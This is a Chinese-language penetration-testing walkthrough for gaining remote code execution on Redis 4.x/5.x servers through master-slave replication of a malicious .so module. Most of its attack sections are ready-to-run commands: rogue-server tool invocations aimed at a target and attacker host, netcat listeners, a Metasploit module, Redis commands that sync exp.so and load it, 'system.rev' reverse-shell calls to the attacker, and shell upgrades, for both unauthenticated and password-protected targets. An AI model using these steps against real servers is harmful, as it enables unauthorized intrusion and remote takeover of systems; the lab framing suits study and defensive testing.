利用方式：
主从复制

- 思路：如果在利用写文件的方式下，没写入权限，或者部分命令被禁用，可以用第二种，利用Redis的**主从复制**的功能，导入一个so文件，实现命令执行。
- 漏洞原理
   - [英文原版](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf)
- exp
   - [redis-rogue-server工具 -- 未授权可用](https://github.com/n0b0dyCN/redis-rogue-server)
   - [Awsome-Redis-Rogue-Server工具 -- 未授权/有密码可用](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)

# 0x00 前置知识
## 为什么考虑到利用主从复制？
未授权的redis首先考虑写文件getshell，这种方式的主要问题在于，redis保存的数据并不是简单的json或者csv，所以写入的文件都会有大量的无用数据。
这种主要利用了crontab、ssh key、webshell这样的文件都有一定的容错性，再加上crontab和ssh服务可以说是服务器的标准服务，所以在以前，这种通过写入文件的getshell方式可以说是通杀。
但随着现代的服务部署方式的不断发展，组件化成了大趋势，比如docker，那么在这种部署模式下，一个单一的容器中不会有除了redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件很难getshell，所以我们要考虑其他的利用手段。
## so文件是什么？
so文件是Linux下的程序函数库,即编译好的可以供其他程序使用的代码和数据。

1、so文件就跟.dll文件差不多。

2、一般来说，so文件就是常说的动态链接库, 都是C或C++编译出来的。与Java比较它通常是用的Class文件（字节码）。

3、Linux下的so文件是不能直接运行的,一般来讲,.so文件称为共享库。

# 0x01 环境搭建
```bash
wget http://download.redis.io/releases/redis-4.0.8.tar.gz
tar xvf redis-4.0.8.tar.gz
cd redis-4.0.8
make
```
# 0x02 远程主从复制RCE
## 2.0 环境搭建
配置文件`redis.conf`修改：
```bash
// 修改 redis.conf 文件如下,可远程登录redis
# bind 127.0.0.1
protect-mode no

// 若要设置登录密码
requirepass 密码 

// 关闭redis
service redis-server stop
```

## 2.1 漏洞原理
漏洞存在于Redis 4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为**主机**，其他的作为**备份机**，主机从机的数据都一样，从机负责读，主机只负责写，通过读写分离来大幅度减轻流量的压力，相当于通过牺牲空间来换取效率的缓解方式。
从机定期从主机拿数据，特殊的，一个从机还可以设置为另一个redis server的主机，这样就是一个有向无环图，形成redis-server集群。
在redis 4.x 之后，通过外部拓展可以在redis中实现一个新的Redis命令，通过写c语言，来编译出.so文件。
在两个Redis实例设置主从模式的时候，Redis的**主机**实例可以通过FULLRESYNC同步文件到**从机**上。然后在**从机**上加载恶意so文件，即可执行命令。
## 2.2 漏洞版本
> Redis 4.x、5.x版本

## 2.3 下载工具
[redis-rogue-server工具](https://github.com/n0b0dyCN/redis-rogue-server)
 -- 该工具无法对Redis密码进行Redis认证，也就是说该工具只适合目标存在Redis未授权访问漏洞时使用。

[Awsome-Redis-Rogue-Server工具](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)
 -- Redis存在密码可以使用该工具
 -- 设置密码：redis.conf中的 `requirepass foobared` 
 -- 将 `redis-rogue-server` 的 `exp.so` 复制到 `Awsome-Redis-Rogue-Server` 文件夹下

## 2.4 利用过程
### 2.4.1 未授权访问（空密码）
#### 1、redis-rogue-server 交互式shell
到redis-rogue-server-master/ 目录下
执行命令：
`python3 redis-rogue-server.py --rhost 靶机ip --lhost 攻击方ip`

`ifconfig`命令可正常使用：

![image](https://user-images.githubusercontent.com/84888757/160878148-b8474e5f-b66a-4c3b-b730-100d65ca5149.png)

#### 2、redis-rogue-server 反弹shell

1、kali开启监听：
`nc -lvvp 2222`

2、到redis-rogue-server-master/ 目录下
执行命令：
`python3 redis-rogue-server.py --rhost 靶机ip --lhost 攻击方ip --lport 攻击方端口`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637650022763-4d08e391-d9ba-4d09-9c90-af28181f55fc.png#clientId=u9ca82c02-4aec-4&from=paste&height=317&id=u97606823&margin=%5Bobject%20Object%5D&name=image.png&originHeight=423&originWidth=1141&originalType=binary&ratio=1&size=92597&status=done&style=none&taskId=u4b47df93-fb65-4556-9e47-332de068b1d&width=856)

3、获取到shell
`ifconfig`命令无法正常执行：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637649974604-9f31418e-df92-4905-858d-11e58bf2f4f9.png#clientId=u9ca82c02-4aec-4&from=paste&id=u88ccee8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=188&originWidth=818&originalType=binary&ratio=1&size=30756&status=done&style=none&taskId=u0b88ed5d-5daf-4223-b609-5a9ccd381a5)

已接收到反弹的shell，可以直接执行命令，或者使用python进入交互式命令执行界面。
`python3 -c "import pty;pty.spawn('/bin/bash')"`
或
`python -c "import pty;pty.spawn('/bin/bash')"`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637650331076-926bb2c6-b1fc-4969-a97d-7b0a3434f4d4.png#clientId=u9ca82c02-4aec-4&from=paste&id=u3dbc8802&margin=%5Bobject%20Object%5D&name=image.png&originHeight=195&originWidth=811&originalType=binary&ratio=1&size=42330&status=done&style=none&taskId=u84972786-63c4-4046-91a3-cc7c773f87c)


#### 3、Awsome交互式 shell
`python3 redis_rogue_server.py -rhost 靶机ip -lhost 攻击方ip`
选择 `i`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637634992732-ce89f9b4-56d5-494a-a1d0-8b33d36f216c.png#clientId=u59cd1f6a-96a6-4&from=paste&height=554&id=udf823566&margin=%5Bobject%20Object%5D&name=image.png&originHeight=738&originWidth=1061&originalType=binary&ratio=1&size=202537&status=done&style=none&taskId=u2fd2fe93-5d29-4066-9111-b5877c2a01c&width=796)

#### 4、Awsome反弹 shell
kali开启nc
`nc -lvvp 6666`

执行exp：
`python3 redis_rogue_server.py -rhost **靶机ip** -lhost **攻击方ip**`

选择`r`即反弹shell，输入kali的ip和监听端口

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637635652849-fffd9773-496e-4fa3-8352-f6f8ec28163b.png#clientId=u59cd1f6a-96a6-4&from=paste&height=235&id=uffe41062&margin=%5Bobject%20Object%5D&name=image.png&originHeight=313&originWidth=1053&originalType=binary&ratio=1&size=76818&status=done&style=none&taskId=uba0e8796-d7bc-4864-8c39-f606515487e&width=790)

接收到反弹的shell：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637635501895-a334a773-d8a5-478c-9080-11d34aba1fc9.png#clientId=u59cd1f6a-96a6-4&from=paste&height=90&id=uae118716&margin=%5Bobject%20Object%5D&name=image.png&originHeight=120&originWidth=820&originalType=binary&ratio=1&size=25434&status=done&style=none&taskId=ua9ae4579-fb3e-42ec-94e2-4043b51df11&width=615)


### 2.4.2 有密码访问

[Awsome-Redis-Rogue-Server工具](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)
 -- Redis存在密码可以使用该工具

密码设置：
redis.conf中的`requirepass 密码`去除注释

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637672935411-97d895a9-01a4-421a-8379-f5d28d35035c.png#clientId=u696b16cd-ca6b-4&from=paste&id=u039a92be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=198&originalType=binary&ratio=1&size=2417&status=done&style=none&taskId=ufa623bd5-4a51-4b78-a721-070c642ae7c)

#### 1、Awsome交互式shell
`python3 redis_rogue_server.py -rhost **靶机ip** -lhost **攻击方ip** -passwd **redis密码**`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637636645671-30a6b412-0d43-4d44-8d6a-b8e9025012df.png#clientId=u59cd1f6a-96a6-4&from=paste&id=ua914a5ca&margin=%5Bobject%20Object%5D&name=image.png&originHeight=735&originWidth=1189&originalType=binary&ratio=1&size=211980&status=done&style=none&taskId=ud71396b7-9fb5-4a1b-ad1f-813d57960e9)

#### 2、Awsome反弹shell
kali开启nc
`nc -lvvp 6666`

执行exp：
`python3 redis_rogue_server.py -rhost **靶机ip** -lhost **攻击方ip**`

选择`r`即反弹shell，输入kali的ip和监听端口

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637637180658-476fba15-6342-4ac6-ab15-19df2be802a6.png#clientId=u59cd1f6a-96a6-4&from=paste&height=248&id=ua0f2d8bc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=1180&originalType=binary&ratio=1&size=87015&status=done&style=none&taskId=uc128425b-3fa2-43f9-8ecf-5593f886286&width=885)


已接收到反弹的shell，可以直接执行命令，或者使用python进入交互式命令执行界面。
`python3 -c "import pty;pty.spawn('/bin/bash')"`
或
`python -c "import pty;pty.spawn('/bin/bash')"`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637637050917-64cc7873-bf35-42c6-94d8-ab03f2e37e0a.png#clientId=u59cd1f6a-96a6-4&from=paste&height=241&id=u0ae2bf6b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=321&originWidth=844&originalType=binary&ratio=1&size=59163&status=done&style=none&taskId=ufdb23589-759a-410b-9ff8-df6f5081285&width=633)

#### 3、msf反弹shell
```bash
use exploit/linux/redis/redis_replication_cmd_exec
set rhosts 靶机ip
set lhosts 攻击方ip
set srvhost 攻击方ip
run
```

`shell`可进入shell界面

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637648535529-b40d43bc-190a-441f-8867-b0fa2506d570.png#clientId=u9ca82c02-4aec-4&from=paste&height=548&id=ud48ac008&margin=%5Bobject%20Object%5D&name=image.png&originHeight=730&originWidth=900&originalType=binary&ratio=1&size=197772&status=done&style=none&taskId=u210176e7-bbfa-4852-9652-44563f358c1&width=675)

# 0x03 本地Redis主从复制RCE反弹shell
## 3.1 漏洞原理
对于只允许本地连接的Redis服务器，可以通过开启主从模式，从远程主机上同步 .so 文件至本地，接着载入恶意 .so 文件模块，反弹shell至远程主机。

## 3.2 漏洞版本
> Redis 4.x ~ 5.x


## 3.3 工具下载
[redis-rogue-server工具](https://github.com/n0b0dyCN/redis-rogue-server)
 -- 该工具无法对Redis密码进行Redis认证，也就是说该工具只适合目标存在Redis未授权访问漏洞时使用。

[Awsome-Redis-Rogue-Server工具](https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server)
 -- Redis存在密码可以使用该工具
 -- 设置密码：redis.conf中的 `requirexxx fooxxx` 
 -- 将 `redis-rogue-server` 的 `exp.so` 复制到 `Awsome-Redis-Rogue-Server` 文件夹下

## 3.4 漏洞利用
这里将redis-rogue-server-master的exp.so复制到Awsome-Redis-Rogue-Server的目录下使用，因为exp.so带system模块。

### 1）kali开启监听
`nc -lvvp 9999`

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637653866888-0ac4778f-47e7-4fdc-853b-50dd72656209.png#clientId=u9ca82c02-4aec-4&from=paste&height=43&id=ucacdba1c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=58&originWidth=239&originalType=binary&ratio=1&size=6664&status=done&style=none&taskId=u64e92781-b659-4c6e-a121-70dd2728eee&width=179)

### 2）kali开启15000端口的主服务器
```bash
///// -v      #冗余模式，仅启动Rouge Server模式
python3 redis_rogue_server.py -v -path exp.so
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637653851438-0095c347-456e-4899-bc0d-dbafc85e6279.png#clientId=u9ca82c02-4aec-4&from=paste&id=uc768ff5c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=834&originalType=binary&ratio=1&size=15455&status=done&style=none&taskId=u7f6aec39-663a-49c8-9fd6-1234dcc7012)

### 3）靶机本机登录redis开启主从模式
`redis-cli -h 127.0.0.1 -a foobared`

     查看是否存在模块，可以看见目前没有可用模块
     
![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654000923-43146776-b00f-4a62-b7af-f2a22e830d81.png#clientId=u9ca82c02-4aec-4&from=paste&height=65&id=ube8dce8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=87&originWidth=615&originalType=binary&ratio=1&size=11208&status=done&style=none&taskId=ucfd95d8c-f78f-489a-87d4-7a013fc3d65&width=461)

将靶机redis服务器作为**从**服务器，
将作为**主**服务器的kali上的恶意exp.so文件同步到靶机redis服务器上：
```bash
靶机执行：
//一般tmp目录都有写权限，所以选择这个目录写入
config set dir /tmp

//设置导出文件的名字
config set dbfilename exp.so

//进行主从同步，将恶意so文件写入到tmp目录
slaveof 攻击方ip 15000

```
靶机截图：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654230735-adbc8c1c-e5d1-4c9f-8057-273b39cb5977.png#clientId=u9ca82c02-4aec-4&from=paste&height=143&id=uea3e4538&margin=%5Bobject%20Object%5D&name=image.png&originHeight=190&originWidth=641&originalType=binary&ratio=1&size=23523&status=done&style=none&taskId=u45924db6-15a8-4b16-bcb7-bebaf10e020&width=481)

> **FULLRESYNC 响应表示第一次复制采用的全量复制**，也就是说，主库会把当前所有的数据都复制给从库。


可以看到kali作为主服务器，kali上出现FULLRESYNC，即**全局**同步数据中，将恶意的exp.so同步到靶机redis服务器上，同步时的截图如下：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654407242-b1d75094-3b00-44d7-b8e0-481ff0c93e25.png#clientId=u9ca82c02-4aec-4&from=paste&height=373&id=ud80ca5b1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=932&originalType=binary&ratio=1&size=191706&status=done&style=none&taskId=u3758a789-0a87-4bfb-a7b1-cf4fa12fa4f&width=466)

### 4）靶机本机执行恶意exp.so文件模块
在靶机redis服务器上，执行恶意模块：
```bash
// 加载写入的恶意so文件模块
module load ./exp.so	

// 查看恶意so有没有加载成功，主要是有没有"system"
module list

```

靶机redis执行恶意模块截图：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637654638580-cc6dd0bc-1dce-4bca-827b-b79b13848e8c.png#clientId=u9ca82c02-4aec-4&from=paste&height=150&id=ue61d2465&margin=%5Bobject%20Object%5D&name=image.png&originHeight=200&originWidth=346&originalType=binary&ratio=1&size=14608&status=done&style=none&taskId=u225b4a7a-8543-4b32-9346-a8b9dc0cc5d&width=260)

靶机执行，**反弹shell**：
```bash
system.rev 攻击机ip 攻击监听端口
```

靶机执行反弹shell命令截图：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637655038915-4353313e-d30a-47f2-b8ce-a9af2e14a667.png#clientId=u9ca82c02-4aec-4&from=paste&height=32&id=u0ec9a921&margin=%5Bobject%20Object%5D&name=image.png&originHeight=43&originWidth=455&originalType=binary&ratio=1&size=3540&status=done&style=none&taskId=u0654600f-4398-441f-8ff3-bd63ad38f5b&width=341)

kali收到反弹的shell：

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637655208889-bad1e0f5-9472-47e5-bbd6-f8f98ca94c04.png#clientId=u9ca82c02-4aec-4&from=paste&id=ua1364d9f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=219&originWidth=840&originalType=binary&ratio=1&size=29943&status=done&style=none&taskId=ufda79f6c-a166-4d0f-a933-2c5a8fb0797)

### 5）靶机关闭主从模式
```bash
slaveof NO ONE
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637655995106-3c9d6a40-da46-4de8-873b-5de4e0b4b08c.png#clientId=u9ca82c02-4aec-4&from=paste&height=40&id=u70b8f04e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=80&originWidth=620&originalType=binary&ratio=1&size=10186&status=done&style=none&taskId=ueb8cea76-3c89-4bbe-8f71-0a36aceef7e&width=310)

### 6）另一种执行系统命令的方式：
```bash
system.exec "id"
```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637657176344-8aa3cba8-b932-42af-82e0-e87d92e326d0.png#clientId=u9ca82c02-4aec-4&from=paste&id=u1883cca0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=237&originWidth=981&originalType=binary&ratio=1&size=60479&status=done&style=none&taskId=u9842c092-33bc-467d-a9e5-0fd8ed9b279)


# 4、SSRF+Redis
参考链接：

- [ssrf与gopher与redis](https://www.cnblogs.com/sijidou/p/13681845.html)
